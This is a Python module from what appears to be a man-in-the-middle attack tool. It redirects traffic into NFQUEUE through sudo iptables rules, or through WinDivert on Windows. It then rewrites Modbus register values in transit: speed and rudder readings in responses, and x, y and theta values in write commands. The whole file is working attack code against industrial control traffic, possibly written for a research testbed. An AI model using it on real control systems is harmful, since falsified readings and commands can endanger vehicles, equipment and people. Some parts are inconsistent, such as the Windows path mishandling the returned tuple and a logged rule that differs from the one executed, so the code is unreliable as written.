'''
NFQ module. Callbacks and persistent object
'''

from scapy.all import IP, TCP, Packet, Ether, IPv6
from scapy.contrib.modbus import ModbusADURequest, ModbusADUResponse
import threading, os, select, subprocess
from .nmap import NMapper
from ..mod_table import ModTable
from ..buffer import Buffer

import platform
os_name = platform.system()

if os_name == "Windows":
    import pydivert
elif os_name == "Linux":
    from netfilterqueue import NetfilterQueue as NFQ
elif os_name == "Darwin":
    from netfilterqueue import NetfilterQueue as NFQ
else:
    print(f"Running on an unidentified system: {os_name}")


class NetFilterQueue:

    def __init__(self, buffer: Buffer, mod_table: ModTable):
        self.stop_event = None
        self.thread = None
        self.callback = None
        self.windows_callback = None
        self.buffer = buffer
        self.table = mod_table


    def is_running(self):
        return self.stop_event is not None or self.thread is not None


    def start(self): 
        if self.is_running():
            self.buffer.put("mitm", "MITM attack is already running")
            return
        self.callback = self.nfq_callback
        self.windows_callback = None
        self.stop_event = threading.Event()
        self.buffer.put("mitm", "Starting MITM attack")

        # Run appropriate packet prerouter
        if os_name == "Linux" or os_name == "Darwin":
            self.thread = threading.Thread(target=self._start_linux, daemon=True)
        elif os_name == "Windows":
            self.thread = threading.Thread(target=self._start_windows, daemon=True)
        self.thread.start()


    def _start_windows(self):
        self.buffer.put("mitm", "Starting WinDivert")

        filt = (
            "true"
        )

        with pydivert.WinDivert(filt) as w:
            self.w = w

            while not self.stop_event.is_set():

                try:
                    packet = w.recv()

                    try:
                        spkt = IP(bytes(packet.raw))
                    except Exception:
                        w.send(packet)
                        continue

                    self.buffer.put("mitm", "Incoming mitm packet", spkt)
                    newspkt = self.modify_spkt(spkt)
                    self.buffer.put("mitm", "Outgoing mitm Packet", spkt)

                    if newspkt is not None:
                        packet.payload = bytes(newspkt)

                    w.send(packet)

                except Exception as e:
                    self.buffer.put(
                        "mitm",
                        f"WinDivert error: {e}"
                    )
                    self.buffer.put("mitm", "Problematic Packet", spkt)
                    pass

        self.buffer.put("mitm", "Stopped WinDivert")


    def _start_linux(self):
        # Calculate iface
        nmapper = NMapper(self.buffer)
        active_iface = nmapper.get_active_iface()

        # IPTables rule
        
        rules = [
            [
                "sudo", "iptables",
                "-t", "mangle",
                "-A", "PREROUTING",
                "-i", active_iface,
                "-j", "NFQUEUE",
                "--queue-num", "1",
            ],
            [
                "sudo", "iptables",
                "-t", "mangle",
                "-A", "POSTROUTING",
                "-o", active_iface,
                "-j", "NFQUEUE",
                "--queue-num", "2",
            ]
        ]

        for cmd in rules:
            result = subprocess.run(cmd, capture_output=True, text=True)
            print(result.stdout)
            print(result.stderr)
        
        self.buffer.put("mitm", f"Adding iptables rule:")
        self.buffer.put("mitm", f"sudo iptables -t mangle -A PREROUTING -i {active_iface} -p TCP -j NFQUEUE --queue-num 1")
        # Part	Meaning
        # iptables	Configure Linux packet filtering rules
        # -t mangle	Use the mangle table (used for packet modification/inspection)
        # -A PREROUTING	Append rule to the PREROUTING chain
        # -i wlp5s0	Match packets arriving on interface wlp5s0
        # -p TCP	Match only TCP packets
        # -j NFQUEUE	Instead of normal processing, send packets to an NFQUEUE
        # --queue-num 1	Send them to queue number 1

        nfq_in = NFQ()
        nfq_out = NFQ()

        nfq_in.bind(1, self.prerouting_callback)
        nfq_out.bind(2, self.postrouting_callback)

        # Get readable file descriptor
        qfd_in = nfq_in.get_fd()
        qfd_out = nfq_out.get_fd()

        poller = select.poll()
        poller.register(qfd_in, select.POLLIN)
        poller.register(qfd_out, select.POLLIN)

        # Pipe for stop signaling
        stop_r, stop_w = os.pipe()
        poller.register(stop_r, select.POLLIN)
        self.buffer.put("mitm", "Starting NFQ")
        try:
            while not self.stop_event.is_set():
                events = poller.poll(500)

                for fd, _ in events:
                    if fd == qfd_in:
                        nfq_in.run(False)

                    elif fd == qfd_out:
                        nfq_out.run(False)

                    elif fd == stop_r:
                        self.stop_event.set()
                    # Stop on error or stop event
        finally:
            nfq_in.unbind()
            nfq_out.unbind()
            os.close(stop_r)
            os.close(stop_w)

            rules = [
                [
                    "sudo", "iptables",
                    "-t", "mangle",
                    "-D", "PREROUTING",
                    "-i", active_iface,
                    "-j", "NFQUEUE",
                    "--queue-num", "1",
                ],
                [
                    "sudo", "iptables",
                    "-t", "mangle",
                    "-D", "POSTROUTING",
                    "-o", active_iface,
                    "-j", "NFQUEUE",
                    "--queue-num", "2",
                ]
            ]

            for cmd in rules:
                subprocess.run(cmd, capture_output=True, text=True)
            self.buffer.put("mitm", "Stopped net filter queue")


    def stop(self):
        if self.thread is None:
            self.buffer.put("mitm", "MITM attack is not running")
            return
        else:
            self.stop_event.set()
            self.thread.join(timeout=2)
            self.stop_event = None
            self.thread = None
            self.callback = None
            self.buffer.put("mitm", "Stopped MITM attack")


    # Callback 
    def prerouting_callback(self, pkt):
        spkt = self.get_spkt(pkt)

        self.buffer.put("mitm", "PREROUTING NFQ unmodded", spkt)
        # TODO add logic and timeline flags if it really does get modded
        spkt, modified = self.modify_spkt(spkt)
        if modified:
            self.buffer.put("mitm", "PREROUTING NFQ modified", spkt)
            pkt.set_payload(bytes(spkt))

        pkt.accept()


    def postrouting_callback(self, pkt):
        spkt = self.get_spkt(pkt)

        self.buffer.put("mitm", "POSTROUTING NFQ", spkt)

        pkt.accept()

    def get_spkt(self, pkt):
        spkt = None
        raw = pkt.get_payload()

        # IPv4
        if raw[0] >> 4 == 4:
            return IP(raw)

        # IPv6
        if raw[0] >> 4 == 6:
            return IPv6(raw)

        # Ethernet?
        if len(raw) >= 14:
            ethertype = int.from_bytes(raw[12:14], "big")

            if ethertype == 0x0800:
                return Ether(raw)
            elif ethertype == 0x0806:
                return Ether(raw)
            elif ethertype == 0x86DD:
                return Ether(raw)
        return spkt

    def nfq_callback(self, pkt: Packet):
        spkt = IP(pkt.get_payload())
        self.buffer.put("mitm", "incoming mitm packet", spkt)
        
        spkt, modified = self.modify_spkt(spkt)

        self.buffer.put("mitm", "outgoing mitm packet", spkt)

        pkt.set_payload(bytes(spkt))
        pkt.accept()

    
    def accept_only(self, pkt: Packet):
        pkt.accept()
    

    def print_and_accept(self, pkt: Packet):
        spkt = IP(pkt.get_payload())
        self.buffer.put("mitm", "Incoming Packet", spkt)
        pkt.accept()
        self.buffer.put("mitm", "Outgoing Packet", spkt)


    def modify_spkt(self, spkt: Packet) -> Packet:
        '''
        Returns a packet, modified according to the mod table
        '''
        modified_flag = False
        if spkt.haslayer("Read Holding Registers Response"):
            mult = self.table.get_raw("speed", "mult")
            offset = self.table.get_raw("speed", "offset")

            mbl = spkt.getlayer(ModbusADUResponse)

            speed = mbl.payload.registerVal[0]
            val = int(speed * mult + offset)
            val = max(0, min(65535, val))
            mbl.payload.registerVal[0] = val

            if len(mbl.payload.registerVal) > 1:
                mult = self.table.get_raw("rudder", "mult")
                offset = self.table.get_raw("rudder", "offset")
                rudder = mbl.payload.registerVal[1]
                val = int(rudder * mult + offset)
                val = max(0, min(65535, val))
                mbl.payload.registerVal[1] = val

            modified_flag = True

        elif spkt.haslayer("Write Single Register"):

            mbl = spkt.getlayer(ModbusADURequest)

            if mbl.payload.registerAddr == 10: # X address
                var = "x"
            elif mbl.payload.registerAddr == 11: # Y address
                var = "y"
            else: # Theta address
                var = "theta"

            z = mbl.payload.registerValue
            mult = self.table.get_raw(var, "mult")
            offset = self.table.get_raw(var, "offset")
            val = int(z * mult + offset)
            val = max(0, min(65535, val))
            mbl.payload.registerValue = val

            modified_flag = True

        # Recalculate checksums if modified
        if modified_flag:
            # del mbl.len
            del spkt[IP].len
            del spkt[TCP].chksum
            del spkt[IP].chksum

            spkt = IP(bytes(spkt))
        return spkt, modified_flag